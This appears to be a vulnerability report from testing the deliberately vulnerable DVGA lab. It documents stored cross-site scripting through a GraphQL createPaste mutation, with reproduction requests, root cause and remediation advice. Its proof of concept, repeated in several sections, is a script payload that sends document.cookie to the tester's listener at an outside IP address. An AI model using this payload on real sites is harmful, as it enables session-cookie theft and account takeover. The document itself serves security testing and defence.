# DVGA-009. Stored Cross-Site Scripting (XSS) via CreatePaste

## Severity

Critical

CVSS v3.1 Score: 9.3 (Critical)

Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N

## Overall CVSS Calculation

Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N
CVSS Base Score:          9.3
Impact Subscore:          5.8
Exploitability Subscore:  2.8
CVSS Temporal Score:      NA
CVSS Environmental Score: NA
Modified Impact Subscore: NA
Overall CVSS Score:       9.3

## CWE

CWE-79 — Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

## OWASP Mapping

* OWASP Top 10 2021: A03 — Injection

## Affected API Endpoint

```text
POST /graphql
```

## Affected Operations

### Mutation

```text
CreatePaste
```

### Mutation Field

```text
createPaste
```

### Affected Arguments

```text
title
content
public
```

### Query

```text
getPastes
```

### Query Field

```text
pastes
```

### Query Argument

```text
public: true
```

### Private Paste Functionality

```text
my_pastes
```

For `public: false`, the stored paste is shown through `/my_pastes`.

## Affected Browser-Level Endpoints

```text
/create_paste
/public_pastes
/my_pastes
```

## Description

Lets check the input fields as well!

While creating pastes, I used `<mark>hi</mark>` to name the paste and also set it as the content.

Well, I saw the HTML code got executed and the `hi` appeared in yellow color. So, there is no effective sanitization or output encoding being applied to the value before it is shown in the browser.

The value submitted through `createPaste` is stored by the application and is later returned through the paste retrieval functionality.

For public pastes, the stored values can be retrieved using the `getPastes` query:

```graphql
query getPastes {
  pastes(public: true) {
    id
    title
    content
    ipAddr
    userAgent
    owner {
      name
    }
  }
}
```

The returned `title` and `content` values are then shown in `/public_pastes`.

For `public: false`, the paste is instead shown through `/my_pastes`.

Well, at this point I knew HTML injection was working, so I wanted to check whether JavaScript could also be executed.

I tried:

```html
<script>fetch(`http://192.168.1.230/?c=${document.cookie}`, {mode:'no-cors'})</script>
```

The payload was accepted by `createPaste` and stored successfully.

When the affected paste was opened and rendered, the JavaScript executed and made a request to my controlled listener containing `document.cookie`.

Well, it gave us the cookie.

So, again it is vulnerable to XSS as well!

The important part is that `createPaste` itself is not responsible for rendering or executing the payload. It is the storage/injection point. The stored value is later retrieved through `getPastes` for public pastes or the `my_pastes` functionality for private pastes, and the browser-facing pages render the returned values without proper output encoding.

Because the JavaScript payload actually executed, this is not limited to HTML injection. This confirms a Stored XSS vulnerability.

## Steps to Reproduce

### Step 1 — Test HTML Injection

Create a paste through:

```http
POST /graphql
```

using the `createPaste` mutation.

Use the following value as both the title and content:

```html
<mark>hi</mark>
```

Example request:

```http
POST /graphql HTTP/2
Host: merlin-declivitous-crowdedly.ngrok-free.dev
Content-Type: application/json

{"query":"mutation CreatePaste ($title: String!, $content: String!, $public: Boolean!, $burn: Boolean!) {
  createPaste(title:$title, content:$content, public:$public, burn: $burn) {
    paste {
      id
      content
      title
      burn
    }
  }
}","variables":{"title":"<mark>hi</mark>","content":"<mark>hi</mark>","public":true,"burn":false}}
```

The application returned the supplied HTML without encoding it:

```http
HTTP/2 200 OK
Content-Type: application/json

{"data":{"createPaste":{"paste":{"id":"23","content":"<mark>hi</mark>","title":"<mark>hi</mark>","burn":false}}}}
```

When the paste was viewed in the browser, the `<mark>` element was interpreted as HTML and the `hi` appeared in yellow.

This confirmed that attacker-controlled HTML was being rendered by the application.

### Step 2 — Test JavaScript Execution

I then tried the following payload:

```html
<script>fetch(`http://192.168.1.230/?c=${document.cookie}`, {mode:'no-cors'})</script>
```

The payload was supplied as both the `title` and `content`.

Request:

```http
POST /graphql HTTP/2
Host: merlin-declivitous-crowdedly.ngrok-free.dev
Content-Type: application/json
```

Relevant variables:

```json
{
  "title": "<script>fetch(`http://192.168.1.230/?c=${document.cookie}`, {mode:'no-cors'})</script>",
  "content": "<script>fetch(`http://192.168.1.230/?c=${document.cookie}`, {mode:'no-cors'})</script>",
  "public": true,
  "burn": false
}
```

The application accepted and stored the payload:

```http
HTTP/2 200 OK
Content-Type: application/json

{"data":{"createPaste":{"paste":{"id":"24","content":"<script>fetch(`http://192.168.1.230/?c=${document.cookie}`, {mode:'no-cors'})</script>","title":"<script>fetch(`http://192.168.1.230/?c=${document.cookie}`, {mode:'no-cors'})</script>","burn":false}}}}
```

### Step 3 — Retrieve the Stored Paste

For a public paste, the stored values are returned through:

```graphql
query getPastes {
  pastes(public: true) {
    id
    title
    content
    ipAddr
    userAgent
    owner {
      name
    }
  }
}
```

The returned values are then rendered through:

```text
/public_pastes
```

For a paste created with:

```text
public: false
```

the stored values are displayed through:

```text
/my_pastes
```

### Step 4 — Confirm XSS Execution

When the affected paste was rendered in the browser, the `<script>` payload executed.

The payload caused the browser to make a request to my controlled listener:

```text
http://192.168.1.230/?c=<document.cookie>
```

using:

```javascript
{mode:'no-cors'}
```

The callback confirmed that the JavaScript was actually executing in the application's browser context.

## Proof of Concept

### HTML Injection

```html
<mark>hi</mark>
```

Result:

```text
The browser interpreted the <mark> element and displayed "hi" with the highlighting effect.
```

### Stored XSS

```html
<script>fetch(`http://192.168.1.230/?c=${document.cookie}`, {mode:'no-cors'})</script>
```

Result:

```text
The stored JavaScript executed when the paste was rendered and generated a request to my controlled listener containing document.cookie.
```

## Attack Flow

```text
Attacker
   |
   | createPaste(title, content)
   v
POST /graphql
   |
   | Payload stored
   v
Stored Paste
   |
   +-----------------------------+
   |                             |
   | public:true                 | public:false
   v                             v
getPastes.pastes                 my_pastes
   |                             |
   +-------------+---------------+
                 |
                 v
        Browser renders
        title / content
                 |
                 v
          JavaScript executes
                 |
                 v
        Attacker-controlled action
```

## Impact

An attacker who can create a paste may be able to store malicious HTML/JavaScript that executes when the affected paste is viewed.

Because JavaScript execution was confirmed in the application's browser context, an attacker could potentially:

* Execute arbitrary JavaScript in the application's origin.
* Perform actions through the victim's authenticated browser session.
* Access information available to JavaScript within the application's origin.
* Modify the application's page or content shown to the victim.
* Perform phishing or UI manipulation attacks using the trusted application origin.

During testing, I confirmed JavaScript execution by causing the browser to send a request to my controlled listener containing `document.cookie`.

## Root Cause

The application accepts attacker-controlled values through the `createPaste` mutation and stores them without applying appropriate sanitization.

Those stored values are subsequently returned through the `getPastes` query for public pastes and through the `my_pastes` functionality for private pastes.

The browser-facing pages then render the returned `title` and `content` values without appropriate output encoding.

So the complete issue is:

```text
createPaste
    ↓
attacker-controlled value stored
    ↓
getPastes / my_pastes
    ↓
value returned to frontend
    ↓
unsafe rendering
    ↓
Stored XSS
```

## Remediation

* Properly HTML-encode `title` and `content` before rendering them in the browser.
* Treat stored paste data as untrusted input even if it came from an authenticated user.
* If HTML is intentionally supported, use a well-maintained HTML sanitization library with a strict allowlist.
* Prevent dangerous script elements and event-handler attributes from being rendered.
* Apply context-appropriate output encoding rather than relying only on input validation.
* Consider implementing a restrictive Content Security Policy (CSP) as an additional defense-in-depth measure.
* Use appropriate security attributes such as `HttpOnly`, `Secure`, and `SameSite` for session cookies.

## Evidence

All manually tested requests, responses, screenshots, and supporting evidence are stored under:

```text
evidence/DVGA-009-Stored-XSS-via-CreatePaste
```

The evidence includes the relevant requests and responses for the `createPaste` mutation, the `getPastes` query, public/private paste rendering, and screenshots demonstrating the HTML injection and JavaScript execution.

## Testing Notes

The functionality was fully manually tested.

I first tested `<mark>hi</mark>` to see whether the input was being treated as HTML. The browser rendered the tag and showed `hi` in yellow, confirming that the supplied HTML was not being safely encoded.

I then tested the `<script>` payload and confirmed that it executed when the stored paste was rendered.

Both the public paste flow (`public: true`) and private paste flow (`public: false`) were considered during testing.

All relevant requests, responses, and screenshots have been saved under:

```text
evidence/DVGA-009-Stored-XSS-via-CreatePaste
```
